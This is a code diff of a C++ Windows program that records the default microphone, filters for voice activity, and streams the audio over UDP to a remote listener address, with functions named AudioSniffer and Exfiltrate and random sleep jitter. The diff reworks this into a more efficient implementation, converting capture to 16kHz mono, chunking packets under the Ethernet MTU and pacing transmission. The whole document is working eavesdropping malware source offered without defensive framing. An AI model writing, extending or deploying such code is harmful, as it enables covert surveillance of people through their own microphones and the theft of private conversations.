@@ -19,7 +19,14 @@ void AudioManager::SetSleepMode(int modeInt) {
 
 void AudioManager::RandomSleep() {
     float value = dist(gen);
-    Sleep(static_cast<DWORD>(value * 1000));
+
+    auto t0 = std::chrono::steady_clock::now();
+    std::this_thread::sleep_for(std::chrono::duration<float>(value));
+    auto t1 = std::chrono::steady_clock::now();
+
+    std::chrono::duration<double> elapsed = t1 - t0;
+    std::cout << "[sleep] requested=" << value
+        << "s actual=" << elapsed.count() << "s\n";
 }
 
 void AudioManager::SetListener(std::string ip_address, int port) {
@@ -36,29 +43,68 @@ void AudioManager::SetListener(std::string ip_address, int port) {
 
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(port);
-    inet_pton(AF_INET, ip_address.c_str(), &serverAddr.sin_addr);
-
+    ZeroMemory(&serverAddr, sizeof(serverAddr));
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(static_cast<u_short>(port));
+    if (inet_pton(AF_INET, ip_address.c_str(), &serverAddr.sin_addr) != 1) {
+        std::cerr << "Bad IP: " << ip_address << "\n";
+        return;
+    }
     socketInitialized = true;
 }
 
 
 bool AudioManager::Initialize() {
-	HRESULT hrInit = CoInitialize(NULL);
-	HRESULT hrCreate = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
+    HRESULT hr;
+    CoInitialize(NULL);
 
-	if (FAILED(hrCreate)) {
-		return false;
-	}
+    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
+    if (FAILED(hr)) return false;
 
-	pEnumerator->GetDefaultAudioEndpoint(eCapture, eConsole, &pDevice);
+    hr = pEnumerator->GetDefaultAudioEndpoint(eCapture, eConsole, &pDevice);
+    if (FAILED(hr)) return false;
 
-	pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
-	// Set the audio format
-	pAudioClient->GetMixFormat(&pwfx);
-	pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, 0, 10000000, 0, pwfx, NULL);
+    hr = pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
+    if (FAILED(hr)) return false;
 
-	pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pCaptureClient);
-	return true;
+    /* Note: We use a local struct to define our desired format.
+       We use the "AUTOCONVERTPCM" flag so Windows handles the math
+       of turning 48kHz Stereo into 16kHz Mono for us.
+    */
+    WAVEFORMATEX targetFormat = { 0 };
+    targetFormat.wFormatTag = WAVE_FORMAT_PCM;
+    targetFormat.nChannels = 1;
+    targetFormat.nSamplesPerSec = 16000;
+    targetFormat.wBitsPerSample = 16;      // <--- ADD THIS
+    targetFormat.nBlockAlign = 2;          // <--- ADD THIS (Channels * Bits/8)
+    targetFormat.nAvgBytesPerSec = targetFormat.nSamplesPerSec * targetFormat.nBlockAlign;
+    targetFormat.cbSize = 0;
+
+    // Use AUDCLNT_STREAMFLAGS_AUTOCONVERTPCM to force the lower sample rate
+    hr = pAudioClient->Initialize(
+        AUDCLNT_SHAREMODE_SHARED,
+        AUDCLNT_STREAMFLAGS_AUTOCONVERTPCM | AUDCLNT_STREAMFLAGS_SRC_DEFAULT_QUALITY,
+        10000000,
+        0,
+        &targetFormat,
+        NULL
+    );
+
+    if (FAILED(hr)) {
+        // If 16kHz fails, fall back to the system mix format
+        pAudioClient->GetMixFormat(&pwfx);
+        hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, 0, 10000000, 0, pwfx, NULL);
+    }
+    else {
+        // Update your global pwfx pointer to match what we actually initialized
+        // This ensures your Sniffer loop knows the correct channel count
+        if (pwfx) CoTaskMemFree(pwfx); // Clean up old memory if it exists
+        pwfx = (WAVEFORMATEX*)CoTaskMemAlloc(sizeof(WAVEFORMATEX));
+        memcpy(pwfx, &targetFormat, sizeof(WAVEFORMATEX));
+    }
+
+    hr = pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pCaptureClient);
+    return SUCCEEDED(hr);
 }
 
 void AudioManager::Release() {
@@ -83,106 +129,121 @@ void AudioManager::AudioSniffer() {
 
         while (packetLength != 0) {
             BYTE* pData;
-            UINT32 numFramesAvailable;
+            UINT32 numFrames;
             DWORD flags;
 
-            if (FAILED(pCaptureClient->GetBuffer(&pData, &numFramesAvailable, &flags, NULL, NULL))) break;
+            if (FAILED(pCaptureClient->GetBuffer(&pData, &numFrames, &flags, NULL, NULL))) break;
 
             if (!(flags & AUDCLNT_BUFFERFLAGS_SILENT)) {
-                float* fData = (float*)pData;
-                UINT32 sampleCount = numFramesAvailable * pwfx->nChannels;
-
+                short* sData = (short*)pData;
                 float totalPower = 0.0f;
-                std::vector<short> tempConverted;
-                tempConverted.reserve(sampleCount); // Pre-allocate for speed
 
-                // 1. Convert and calculate power in one pass
-                for (UINT32 i = 0; i < sampleCount; i++) {
-                    float sample = fData[i];
-
-                    // Simple peak power check
-                    totalPower += fabsf(sample);
-
-                    if (sample > 1.0f) sample = 1.0f;
-                    if (sample < -1.0f) sample = -1.0f;
-                    tempConverted.push_back((short)(sample * 32767.0f));
+                // Process 16-bit PCM Mono
+                for (UINT32 i = 0; i < numFrames; i++) {
+                    // Convert to absolute float for power calculation
+                    totalPower += fabsf((float)sData[i] / 32768.0f);
                 }
 
-                float averagePower = totalPower / sampleCount;
+                float averagePower = totalPower / numFrames;
 
-                // 2. POWER THRESHOLD CHECK (VAD)
-                // 0.005f is a good start for "voice," 0.001f for "room noise"
+                // If power is above threshold, save the raw bytes
                 if (averagePower > 0.002f) {
-                    // 3. ONE SINGLE LOCK for the whole packet
                     std::lock_guard<std::mutex> lock(bufferMutex);
-                    const char* rawBytes = reinterpret_cast<const char*>(tempConverted.data());
-                    size_t byteSize = tempConverted.size() * sizeof(short);
-                    globalAudioBuffer.insert(globalAudioBuffer.end(), rawBytes, rawBytes + byteSize);
+                    char* raw = reinterpret_cast<char*>(sData);
+                    globalAudioBuffer.insert(globalAudioBuffer.end(), raw, raw + (numFrames * sizeof(short)));
                 }
             }
 
-            pCaptureClient->ReleaseBuffer(numFramesAvailable);
+            pCaptureClient->ReleaseBuffer(numFrames);
             pCaptureClient->GetNextPacketSize(&packetLength);
         }
-        Sleep(1); // Small sleep to keep CPU usage down
+        Sleep(1);
     }
 }
 
 
-
 void AudioManager::Exfiltrate() {
+    using clock = std::chrono::steady_clock;
+    auto nextFlush = clock::now();
+    const auto flushEvery = std::chrono::seconds(5);
+
+    // Optimized packet size for Ethernet (MTU 1500 - IP/UDP headers)
+    const size_t CHUNK_SIZE = 1440;
+
     while (bRunning) {
         RandomSleep();
-        std::cout << "[+] Done sleeping" << std::endl;
-        std::vector<char> dataToProcess; 
 
+        if (clock::now() < nextFlush) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+            continue;
+        }
+
+        std::vector<char> dataToProcess;
         {
             std::unique_lock<std::mutex> lock(bufferMutex);
 
-            // OPTIMIZATION: Only "drain" the siphon if we have enough data to be efficient
-            // 64KB is a good 'full' packet size for raw audio
-            if (globalAudioBuffer.size() < 8192 && bRunning) {
-                lock.unlock(); // Explicitly unlock safely
-                std::this_thread::sleep_for(std::chrono::milliseconds(100));
+            // Wait until we have a substantial amount of data to make 
+            // the network overhead worth it (e.g., at least 10KB)
+            if (globalAudioBuffer.size() < 10240 && bRunning) {
+                lock.unlock();
+                std::this_thread::sleep_for(std::chrono::milliseconds(200));
                 continue;
             }
 
             dataToProcess.swap(globalAudioBuffer);
         }
-        
-        if (dataToProcess.empty()) {
-            std::cout << "[+] Dataframe is empty!" << std::endl;
-            std::this_thread::sleep_for(std::chrono::milliseconds(100));
-            continue;
-        }
+
+        if (dataToProcess.empty()) continue;
 
         if (socketInitialized) {
-            const size_t MAX_UDP_SIZE = 8192;
             size_t offset = 0;
+            size_t totalSize = dataToProcess.size();
 
-            while (offset < dataToProcess.size()) {
-                size_t toSend = min(MAX_UDP_SIZE, dataToProcess.size() - offset);
-                std::cout << "[+] Sending " << toSend << " bytes of data to listener" << std::endl;
-                int result = sendto(udpSocket, dataToProcess.data() + offset, (int)toSend, 0,
-                    (struct sockaddr*)&serverAddr, sizeof(serverAddr));
+            while (offset < totalSize && bRunning) {
+                size_t remaining = totalSize - offset;
+                size_t toSend = (remaining > CHUNK_SIZE) ? CHUNK_SIZE : remaining;
+
+                int result = sendto(udpSocket,
+                    dataToProcess.data() + offset,
+                    static_cast<int>(toSend), 0,
+                    (struct sockaddr*)&serverAddr,
+                    sizeof(serverAddr));
 
                 if (result == SOCKET_ERROR) {
                     int err = WSAGetLastError();
-                    if (err != 10054) std::cerr << "Socket Error: " << err << std::endl;
+                    if (err != 10054) { // Ignore connection reset by peer
+                        std::cerr << "[!] Socket Error: " << err << "\n";
+                        break;
+                    }
                 }
 
                 offset += toSend;
+
+                /* PACING LOGIC:
+                   Sending 35k packets instantly is a "burst."
+                   This tiny sleep (1-2ms) ensures the network card and
+                   the receiver can breathe.
+                */
+                if (offset < totalSize) {
+                    std::this_thread::sleep_for(std::chrono::milliseconds(1));
+                }
             }
+
+            std::cout << "[+] Exfiltrated " << totalSize / 1024 << " KB across "
+                << (totalSize / CHUNK_SIZE) + 1 << " packets.\n";
         }
+
+        nextFlush = clock::now() + flushEvery;
     }
 }
 
 void AudioManager::Stop() {
     bRunning = false;
-    if (sniffer.joinable()) {
-        sniffer.join();
-    }
-	Release();
+
+    if (sniffer.joinable()) sniffer.join();
+    if (exfilThread.joinable()) exfilThread.join();
+
+    Release();
 }
 
 void AudioManager::Start() {
@@ -191,7 +252,6 @@ void AudioManager::Start() {
     }
     LaunchSnifferThread();
     exfilThread = std::thread(&AudioManager::Exfiltrate, this);
-    exfilThread.detach();
-    Exfiltrate();
+    exfilThread.join();
     Stop();
 }
